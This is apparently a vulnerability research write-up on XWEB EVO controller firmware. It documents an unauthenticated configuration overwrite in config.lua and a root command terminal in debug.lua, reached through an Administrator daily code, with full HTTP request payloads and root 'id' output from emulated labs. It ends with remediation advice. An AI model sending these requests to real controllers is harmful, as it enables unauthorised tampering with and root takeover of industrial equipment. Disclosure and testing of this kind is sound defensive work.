# PoC14 — XWEB EVO unauthenticated config write and Administrator root terminal

## Status

Validated with actual vendor Lighttpd/Lua handlers in isolated QEMU/bubblewrap
labs. No physical controller or third-party address was contacted.

- XWEB3000/5000 EVO 5.8.7 i686: both issues validated over loopback HTTP.
- XWEB300D EVO 5.8.8 ARM: both issues validated over loopback HTTP. The ARM
  config test used `lab_canary=ARM_CONFIG`, verified readback, restored the
  original configuration, and returned `overall: PASS`.

## 1. Unauthenticated configuration overwrite

`config.lua` contains no session or permission check. `action=set` writes the
supplied `content` directly to `/etc/xwebconfig.json`; `action=get` returns the
result.

A harmless lab marker was written without any cookie, token, or credentials:

```http
POST /cgi-bin/config.lua
Content-Type: application/x-www-form-urlencoded

action=set&content={"model_type":"XWEB3000","CPF":"LOCALTEST","lab_canary":"UNAUTH_WRITE"}
```

Response:

```json
{"status":"ok"}
```

An unauthenticated `action=get` returned the lab marker. The original
configuration was then restored and verified on both architectures. This proves
arbitrary central configuration overwrite, not direct code execution by itself.
Feature flags and `model_type` affect later privileged behavior.

Evidence:

- `results/evo-x86-config-set-response.json`
- `results/evo-x86-config-get-after.json`
- `results/evo-x86-config-get-restored.json`
- `results/evo-arm-5.8.8-config-write.txt`
- `lab/evo-arm-config-test.sh`
- `extracted/XWEB_EVO_5.8.7_3000_5000_rootfs/opt/xweb/www/cgi-bin/config.lua:14-39`

## 2. Daily-code Administrator to direct root terminal

`debug.lua` requires an Administrator session but passes `command` verbatim to
`io.popen`. Unlike the earlier quote-breakout finding, this is a direct command
execution endpoint.

The lab authenticated with the daily code derived from the public documentation
MAC/date, then sent:

```http
POST /cgi-bin/debug.lua
Content-Type: application/x-www-form-urlencoded

action=terminal&command=id&SSES=<fresh-administrator-token>
```

i686 5.8.7 result:

```text
uid=0(root) gid=0(root) groups=...,0(root)
```

ARM 5.8.8 result:

```text
uid=0(root) gid=0 groups=...,0
```

A request without a session returned `PERMISSION_DENIED`.

Evidence:

- `results/evo-x86-debug-terminal.json`
- `results/evo-x86-debug-terminal-no-session.json`
- `results/evo-arm-5.8.8-debug-terminal.json`
- `extracted/XWEB_EVO_5.8.7_3000_5000_rootfs/opt/xweb/www/cgi-bin/debug.lua:20-27,67-79`

## Boundary and remediation direction

Physical-device reachability has not been tested. Use these handlers only on an
owned device or isolated emulator. Require authentication and authorization for
configuration reads/writes, remove the general-purpose terminal action from the
production web interface, and do not pass web-supplied commands to a shell.
